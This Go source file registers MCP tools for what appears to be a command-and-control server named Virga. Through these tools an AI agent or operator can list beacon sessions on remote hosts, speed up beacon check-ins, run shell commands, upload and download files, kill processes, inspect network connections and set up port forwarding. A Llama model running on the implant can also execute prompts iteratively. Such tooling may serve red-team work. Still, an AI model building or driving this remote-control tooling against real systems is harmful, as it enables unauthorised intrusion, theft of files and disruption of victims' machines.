package streamable

import (
	"context"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/ThinkInAIXYZ/go-mcp/protocol"
	"github.com/ThinkInAIXYZ/go-mcp/server"
	"github.com/r74tech/virga/internal/server/mcp/tools"
	localprotocol "github.com/r74tech/virga/internal/server/protocol"
	"github.com/r74tech/virga/internal/server/session"
)

// interfaces for dependency injection
type SessionManager interface {
	GetActiveSessions() []*session.Session
	GetSession(id string) *session.Session
}

type BeaconManager interface {
	Count() int
}

type Database interface {
	QueryRow(query string, args ...interface{}) *sql.Row
}

var startTime = time.Now()

type SessionListRequest struct{}

type SessionCommandRequest struct {
	SessionID     string  `json:"session_id" jsonschema:"description=Target session ID,required"`
	Command       string  `json:"command" jsonschema:"description=Command to execute (shell command Llama prompt or memdb query),required"`
	Type          string  `json:"type,omitempty" jsonschema:"description=Command type (default: shell)"`
	UseLlama      bool    `json:"use_llama,omitempty" jsonschema:"description=Use Llama AI to interpret and execute the command (default: false)"`
	MaxIterations int     `json:"max_iterations,omitempty" jsonschema:"description=Maximum iterations for Llama interactive mode (default: 5)"`
	Temperature   float64 `json:"temperature,omitempty" jsonschema:"description=Temperature for Llama generation 0.0-1.0 (default: 0.7)"`
}

type SystemStatusRequest struct{}

type InteractBeaconRequest struct {
	SessionID string `json:"session_id" description:"Target session ID" required:"true"`
}

type StopInteractRequest struct {
	SessionID string `json:"session_id" description:"Target session ID" required:"true"`
}

// Alias for shell command
type ShellRequest struct {
	SessionID string `json:"session_id" description:"Target session ID" required:"true"`
	Command   string `json:"command" description:"Shell command to execute" required:"true"`
}

type LsRequest struct {
	SessionID string `json:"session_id" description:"Target session ID" required:"true"`
	Path      string `json:"path" description:"Directory path to list"`
}

// File operation requests
type FileUploadRequest struct {
	SessionID  string `json:"session_id" jsonschema:"description=Target session ID,required"`
	RemotePath string `json:"remote_path" jsonschema:"description=Path where the file will be saved on the remote system,required"`
	Content    string `json:"content" jsonschema:"description=Base64 encoded file content,required"`
}

type FileDownloadRequest struct {
	SessionID  string `json:"session_id" jsonschema:"description=Target session ID,required"`
	RemotePath string `json:"remote_path" jsonschema:"description=Path of the file to download from the remote system,required"`
}

// System operation requests
type SystemInfoRequest struct {
	SessionID string `json:"session_id" jsonschema:"description=Target session ID,required"`
}

// Process management requests
type ProcessListRequest struct {
	SessionID string `json:"session_id" jsonschema:"description=Target session ID,required"`
}

type KillProcessRequest struct {
	SessionID string `json:"session_id" jsonschema:"description=Target session ID,required"`
	PID       int    `json:"pid" jsonschema:"description=Process ID to kill,required"`
}

// Network operation requests
type NetworkConnectionsRequest struct {
	SessionID string `json:"session_id" jsonschema:"description=Target session ID,required"`
}

type PortForwardRequest struct {
	SessionID  string `json:"session_id" jsonschema:"description=Target session ID,required"`
	LocalPort  int    `json:"local_port" jsonschema:"description=Local port to forward from,required"`
	RemoteHost string `json:"remote_host" jsonschema:"description=Remote host to forward to,required"`
	RemotePort int    `json:"remote_port" jsonschema:"description=Remote port to forward to,required"`
}

// RegisterTools registers all tools to the streamable MCP server
func RegisterTools(mcpServer *server.Server, sessionMgr SessionManager, beaconMgr BeaconManager, db Database) error {
	// Use centralized tool definitions
	mcpServer.RegisterTool(tools.SessionListTool, func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		sessions := sessionMgr.GetActiveSessions()

		var text string
		if len(sessions) == 0 {
			text = "No active sessions"
		} else {
			text = fmt.Sprintf("Active sessions: %d\n\n", len(sessions))
			for _, sess := range sessions {
				info := sess.Information()
				text += fmt.Sprintf("ID: %s\n", sess.ID)
				text += fmt.Sprintf("  User: %s@%s\n", info["username"], info["hostname"])
				text += fmt.Sprintf("  OS: %s (%s)\n", info["os"], info["arch"])
				text += fmt.Sprintf("  IP: %s\n", info["ip"])
				text += fmt.Sprintf("  Last Seen: %s\n\n", sess.LastSeen().Format("2006-01-02 15:04:05"))
			}
		}

		return &protocol.CallToolResult{
			Content: []protocol.Content{
				&protocol.TextContent{
					Type: "text",
					Text: text,
				},
			},
		}, nil
	})

	mcpServer.RegisterTool(tools.SessionCommandTool, handleSessionCommand(sessionMgr))

	mcpServer.RegisterTool(tools.GetSystemStatusTool, func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		activeSessions := sessionMgr.GetActiveSessions()

		// Get statistics from database
		var totalSessions int
		db.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&totalSessions)

		stats := map[string]interface{}{
			"server": map[string]interface{}{
				"name":    "Virga",
				"version": "2.0.0",
				"uptime":  time.Since(startTime).String(),
			},
			"sessions": map[string]interface{}{
				"active": len(activeSessions),
				"total":  totalSessions,
			},
			"beacons": map[string]interface{}{
				"total": beaconMgr.Count(),
			},
		}

		jsonData, err := json.MarshalIndent(stats, "", "  ")
		if err != nil {
			return nil, err
		}

		return &protocol.CallToolResult{
			Content: []protocol.Content{
				&protocol.TextContent{
					Type: "text",
					Text: string(jsonData),
				},
			},
		}, nil
	})

	mcpServer.RegisterTool(tools.InteractBeaconTool, func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var interactReq InteractBeaconRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &interactReq); err != nil {
			return nil, err
		}

		sess := sessionMgr.GetSession(interactReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", interactReq.SessionID)
		}

		// Set interactive mode
		sess.SetInteractive(true)
		sess.SetReconnectTime(1 * time.Second)

		info := sess.Information()
		text := fmt.Sprintf("🟢 Interactive mode enabled for session %s\n\n", interactReq.SessionID)
		text += "Session Information:\n"
		text += fmt.Sprintf("  Agent ID: %s\n", sess.ID)
		text += fmt.Sprintf("  User: %s@%s\n", info["username"], info["hostname"])
		text += fmt.Sprintf("  OS: %s\n", info["os"])
		text += fmt.Sprintf("  IP: %s\n", info["ip"])
		text += "\nBeacon will check in every 1 second\n"
		text += "Use 'stop_interact' to return to normal mode"

		return &protocol.CallToolResult{
			Content: []protocol.Content{
				&protocol.TextContent{
					Type: "text",
					Text: text,
				},
			},
		}, nil
	})

	mcpServer.RegisterTool(tools.StopInteractTool, func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var stopReq StopInteractRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &stopReq); err != nil {
			return nil, err
		}

		sess := sessionMgr.GetSession(stopReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", stopReq.SessionID)
		}

		// Disable interactive mode
		sess.SetInteractive(false)
		sess.SetReconnectTime(30 * time.Second)

		return &protocol.CallToolResult{
			Content: []protocol.Content{
				&protocol.TextContent{
					Type: "text",
					Text: fmt.Sprintf("🔴 Interactive mode disabled for session %s\nBeacon will check in every 30 seconds", stopReq.SessionID),
				},
			},
		}, nil
	})

	mcpServer.RegisterTool(tools.ShellTool, func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var shellReq ShellRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &shellReq); err != nil {
			return nil, err
		}

		// Call session_command
		cmdReq := &protocol.CallToolRequest{
			Name: "session_command",
			RawArguments: mustMarshal(SessionCommandRequest{
				SessionID: shellReq.SessionID,
				Command:   shellReq.Command,
				Type:      "shell",
			}),
		}

		return handleSessionCommand(sessionMgr)(ctx, cmdReq)
	})

	mcpServer.RegisterTool(tools.LsTool, func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var lsReq LsRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &lsReq); err != nil {
			return nil, err
		}

		// Default path
		path := lsReq.Path
		if path == "" {
			path = "."
		}

		// Execute ls -la command
		cmdReq := &protocol.CallToolRequest{
			Name: "session_command",
			RawArguments: mustMarshal(SessionCommandRequest{
				SessionID: lsReq.SessionID,
				Command:   fmt.Sprintf("ls -la %s", path),
				Type:      "shell",
			}),
		}

		return handleSessionCommand(sessionMgr)(ctx, cmdReq)
	})

	mcpServer.RegisterTool(tools.FileUploadTool, handleFileUpload(sessionMgr))

	mcpServer.RegisterTool(tools.FileDownloadTool, handleFileDownload(sessionMgr))

	mcpServer.RegisterTool(tools.SystemInfoTool, handleSystemInfo(sessionMgr))

	mcpServer.RegisterTool(tools.ProcessListTool, handleProcessList(sessionMgr))

	mcpServer.RegisterTool(tools.KillProcessTool, handleKillProcess(sessionMgr))

	mcpServer.RegisterTool(tools.NetworkConnectionsTool, handleNetworkConnections(sessionMgr))

	mcpServer.RegisterTool(tools.PortForwardTool, handlePortForward(sessionMgr, db))

	return nil
}

// session_command handler
func handleSessionCommand(sessionMgr SessionManager) func(context.Context, *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
	return func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var cmdReq SessionCommandRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &cmdReq); err != nil {
			return nil, err
		}

		if cmdReq.Type == "" {
			cmdReq.Type = "shell"
		}

		sess := sessionMgr.GetSession(cmdReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", cmdReq.SessionID)
		}

		// Check if this is a MemDB command
		isMemDB := false
		memdbQuery := ""
		if strings.HasPrefix(strings.ToLower(cmdReq.Command), "memdb ") {
			isMemDB = true
			memdbQuery = strings.TrimPrefix(cmdReq.Command, "memdb ")
			memdbQuery = strings.TrimPrefix(memdbQuery, "MemDB ")
		}

		var taskID string
		var err error

		if cmdReq.UseLlama {
			// Get Llama parameters with defaults
			maxIterations := cmdReq.MaxIterations
			if maxIterations == 0 {
				maxIterations = 5
			}

			temperature := cmdReq.Temperature
			if temperature == 0 {
				temperature = 0.7 // Match beacon.yaml default
			}

			// Execute as Llama interactive task
			taskID, err = sess.ExecuteCommand(string(localprotocol.TaskTypeLlamaInteractive), map[string]interface{}{
				"prompt":         cmdReq.Command,
				"max_iterations": maxIterations,
				"temperature":    temperature,
			})
		} else if isMemDB {
			// Execute as MemDB query
			taskID, err = sess.ExecuteCommand(string(localprotocol.TaskTypeMemDBQuery), map[string]interface{}{
				"query": memdbQuery,
			})
		} else {
			// Execute as regular command
			taskID, err = sess.ExecuteCommand(cmdReq.Type, map[string]interface{}{
				"command": cmdReq.Command,
			})
		}

		if err != nil {
			return nil, fmt.Errorf("failed to execute command: %w", err)
		}

		// Wait for task completion - longer timeout for Llama commands
		timeoutDuration := 30 * time.Second
		if cmdReq.UseLlama {
			timeoutDuration = 5 * time.Minute
		}
		timeout := time.After(timeoutDuration)
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return nil, ctx.Err()
			case <-timeout:
				return &protocol.CallToolResult{
					Content: []protocol.Content{
						&protocol.TextContent{
							Type: "text",
							Text: fmt.Sprintf("Task %s timed out", taskID),
						},
					},
				}, nil
			case <-ticker.C:
				result := sess.GetTaskResult(taskID)
				if result != nil {
					return &protocol.CallToolResult{
						Content: []protocol.Content{
							&protocol.TextContent{
								Type: "text",
								Text: result.Output,
							},
						},
					}, nil
				}
			}
		}
	}
}

// Helper function
func mustMarshal(v interface{}) json.RawMessage {
	data, err := json.Marshal(v)
	if err != nil {
		panic(fmt.Sprintf("failed to marshal arguments: %v", err))
	}
	return data
}

// File operation handlers
func handleFileUpload(sessionMgr SessionManager) func(context.Context, *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
	return func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var uploadReq FileUploadRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &uploadReq); err != nil {
			return nil, err
		}

		sess := sessionMgr.GetSession(uploadReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", uploadReq.SessionID)
		}

		// Decode base64 content
		content, err := base64.StdEncoding.DecodeString(uploadReq.Content)
		if err != nil {
			return nil, fmt.Errorf("failed to decode content: %w", err)
		}

		// Create upload task
		taskID, err := sess.ExecuteCommand("upload", map[string]interface{}{
			"remote_path": uploadReq.RemotePath,
			"content":     content,
		})
		if err != nil {
			return nil, fmt.Errorf("failed to upload file: %w", err)
		}

		// Wait for result
		return waitForTaskResult(ctx, sess, taskID, 2*time.Minute, fmt.Sprintf("File uploaded to %s", uploadReq.RemotePath))
	}
}

func handleFileDownload(sessionMgr SessionManager) func(context.Context, *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
	return func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var downloadReq FileDownloadRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &downloadReq); err != nil {
			return nil, err
		}

		sess := sessionMgr.GetSession(downloadReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", downloadReq.SessionID)
		}

		// Create download task
		taskID, err := sess.ExecuteCommand("download", map[string]interface{}{
			"remote_path": downloadReq.RemotePath,
		})
		if err != nil {
			return nil, fmt.Errorf("failed to download file: %w", err)
		}

		// Wait for result (base64 encoded content)
		return waitForTaskResult(ctx, sess, taskID, 2*time.Minute, fmt.Sprintf("File downloaded from %s", downloadReq.RemotePath))
	}
}

// System operation handlers
func handleSystemInfo(sessionMgr SessionManager) func(context.Context, *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
	return func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var infoReq SystemInfoRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &infoReq); err != nil {
			return nil, err
		}

		sess := sessionMgr.GetSession(infoReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", infoReq.SessionID)
		}

		// Create system info task
		taskID, err := sess.ExecuteCommand("sysinfo", map[string]interface{}{})
		if err != nil {
			return nil, fmt.Errorf("failed to get system info: %w", err)
		}

		// Wait for result
		return waitForTaskResult(ctx, sess, taskID, 30*time.Second, "System information retrieved")
	}
}

// Process management handlers
func handleProcessList(sessionMgr SessionManager) func(context.Context, *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
	return func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var listReq ProcessListRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &listReq); err != nil {
			return nil, err
		}

		sess := sessionMgr.GetSession(listReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", listReq.SessionID)
		}

		// Create process list task
		taskID, err := sess.ExecuteCommand("ps", map[string]interface{}{})
		if err != nil {
			return nil, fmt.Errorf("failed to list processes: %w", err)
		}

		// Wait for result
		return waitForTaskResult(ctx, sess, taskID, 30*time.Second, "Process list retrieved")
	}
}

func handleKillProcess(sessionMgr SessionManager) func(context.Context, *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
	return func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var killReq KillProcessRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &killReq); err != nil {
			return nil, err
		}

		sess := sessionMgr.GetSession(killReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", killReq.SessionID)
		}

		// Create kill process task
		taskID, err := sess.ExecuteCommand("kill", map[string]interface{}{
			"pid": killReq.PID,
		})
		if err != nil {
			return nil, fmt.Errorf("failed to kill process: %w", err)
		}

		// Wait for result
		return waitForTaskResult(ctx, sess, taskID, 30*time.Second, fmt.Sprintf("Process %d killed", killReq.PID))
	}
}

// Network operation handlers
func handleNetworkConnections(sessionMgr SessionManager) func(context.Context, *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
	return func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var netReq NetworkConnectionsRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &netReq); err != nil {
			return nil, err
		}

		sess := sessionMgr.GetSession(netReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", netReq.SessionID)
		}

		// Create network connections task
		taskID, err := sess.ExecuteCommand("netstat", map[string]interface{}{})
		if err != nil {
			return nil, fmt.Errorf("failed to list network connections: %w", err)
		}

		// Wait for result
		return waitForTaskResult(ctx, sess, taskID, 30*time.Second, "Network connections retrieved")
	}
}

func handlePortForward(sessionMgr SessionManager, db Database) func(context.Context, *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
	return func(ctx context.Context, req *protocol.CallToolRequest) (*protocol.CallToolResult, error) {
		var forwardReq PortForwardRequest
		if err := protocol.VerifyAndUnmarshal(req.RawArguments, &forwardReq); err != nil {
			return nil, err
		}

		sess := sessionMgr.GetSession(forwardReq.SessionID)
		if sess == nil {
			return nil, fmt.Errorf("session not found: %s", forwardReq.SessionID)
		}

		// Create port forward task
		taskID, err := sess.ExecuteCommand("portfwd", map[string]interface{}{
			"local_port":  forwardReq.LocalPort,
			"remote_host": forwardReq.RemoteHost,
			"remote_port": forwardReq.RemotePort,
		})
		if err != nil {
			return nil, fmt.Errorf("failed to set up port forwarding: %w", err)
		}

		// Wait for result
		successMsg := fmt.Sprintf("Port forwarding set up: %d -> %s:%d",
			forwardReq.LocalPort, forwardReq.RemoteHost, forwardReq.RemotePort)
		return waitForTaskResult(ctx, sess, taskID, 30*time.Second, successMsg)
	}
}

// Helper function to wait for task result
func waitForTaskResult(ctx context.Context, sess *session.Session, taskID string, timeout time.Duration, successMsg string) (*protocol.CallToolResult, error) {
	timeoutCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-timeoutCtx.Done():
			return nil, fmt.Errorf("task %s timed out", taskID)
		case <-ticker.C:
			result := sess.GetTaskResult(taskID)
			if result != nil {
				text := successMsg
				if result.Output != "" {
					text = result.Output
				}
				if result.ExitCode != 0 || result.Error != "" {
					text = fmt.Sprintf("Task failed: %s", result.Output)
					if result.Error != "" {
						text += fmt.Sprintf("\nError: %s", result.Error)
					}
				}

				return &protocol.CallToolResult{
					Content: []protocol.Content{
						&protocol.TextContent{
							Type: "text",
							Text: text,
						},
					},
				}, nil
			}
		}
	}
}
